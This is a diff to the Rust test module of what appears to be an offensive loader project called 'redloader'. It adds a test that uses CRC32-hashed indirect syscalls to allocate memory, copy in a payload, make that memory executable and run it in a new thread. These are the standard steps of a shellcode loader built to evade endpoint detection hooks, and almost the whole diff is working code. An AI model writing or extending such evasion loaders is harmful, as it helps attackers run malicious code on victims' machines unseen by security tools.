@@ -1,6 +1,6 @@
 
 #[cfg(test)]
-mod direct_syscalls {
+mod syscalls {
     use std::ffi::c_void;
     use std::ptr;
     use std::io::Write;
@@ -10,6 +10,7 @@ mod direct_syscalls {
     use evasion::syscalls::{prepare_direct_syscall, run_direct_syscall};
     use windows::Win32::System::Threading::{GetThreadId, THREAD_ALL_ACCESS};
     use redloader::evasion;
+    use redloader::evasion::syscalls::{prepare_indirect_syscall, run_indirect_syscall};
 
     const NT_ALLOCATE_VIRTUAL_MEMORY_CRC32: u32 = 0xe77460e0;
     const NT_PROTECT_VIRTUAL_MEMORY_CRC32: u32 = 0x5e84b28c;
@@ -48,7 +49,7 @@ mod direct_syscalls {
             let h_process: isize = -1;
             let h_thread: HANDLE = HANDLE::default();
 
-            println!("[#] Press enter to quit...");
+            println!("[#] Press enter to attach a debugger...");
             std::io::stdout().flush().unwrap();
             let mut input = String::new();
             let _ = std::io::stdin().read_line(&mut input);
@@ -84,5 +85,54 @@ mod direct_syscalls {
             let _ = std::io::stdin().read_line(&mut input);
         }
     }
+
+    #[test]
+    fn test_indirect_syscall() {
+
+        let mut p_address: *mut c_void = ptr::null_mut();
+        let mut s_payload: usize = size_of_val(&PAYLOAD);
+        let old_protection: u32 = 0;
+
+        unsafe {
+            let h_process: isize = -1;
+            let h_thread: HANDLE = HANDLE::default();
+
+            println!("[#] Press enter to attach a debugger...");
+            std::io::stdout().flush().unwrap();
+            let mut input = String::new();
+            let _ = std::io::stdin().read_line(&mut input);
+
+            // allocating memory
+            prepare_indirect_syscall(NT_ALLOCATE_VIRTUAL_MEMORY_CRC32);
+            let status: usize = run_indirect_syscall(h_process, &mut p_address, 0, &mut s_payload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            assert_eq!(status, 0x00,"[!] NtAllocateVirtualMemory Failed With Error: {:x}", status);
+            assert!(!p_address.is_null(), "[!] NtAllocateVirtualMemory Returned Null Pointer");
+
+            // copying the payload
+            println!("[+] Allocated Memory At Address {:?}", p_address);
+            ptr::copy_nonoverlapping(PAYLOAD.as_ptr(), p_address as _, s_payload);
+
+            // changing memory protection
+            prepare_indirect_syscall(NT_PROTECT_VIRTUAL_MEMORY_CRC32);
+            let status: usize = run_indirect_syscall(h_process, &mut p_address, &mut s_payload, PAGE_EXECUTE_READ, &old_protection);
+            assert_eq!(status, 0x00,"[!] NtProtectVirtualMemory Failed With Error: {:x}", status);
+
+            prepare_indirect_syscall(NT_CREATE_THREAD_EX_CRC32);
+            let status: usize = run_indirect_syscall(&h_thread, THREAD_ALL_ACCESS, NULL64, h_process, p_address, NULL64, false as i32, NULL64, NULL64, NULL64, NULL64);
+            assert_eq!(status, 0x00,"[!] NtCreateThreadEx Failed With Error: {:x}", status);
+
+            println!("[+] Thread {} Created Of Entry: {:?} \n", GetThreadId(h_thread), p_address);
+
+            prepare_indirect_syscall(NT_WAIT_FOR_SINGLE_OBJECT_CRC32);
+            let status: usize = run_indirect_syscall(h_thread, FALSE, NULL64);
+            assert_eq!(status, 0x00,"[!] NtWaitForSingleObject Failed With Error: {:x}", status);
+
+            println!("[#] Press enter to quit...");
+            std::io::stdout().flush().unwrap();
+            let mut input = String::new();
+            let _ = std::io::stdin().read_line(&mut input);
+        }
+    }
+
 
 }
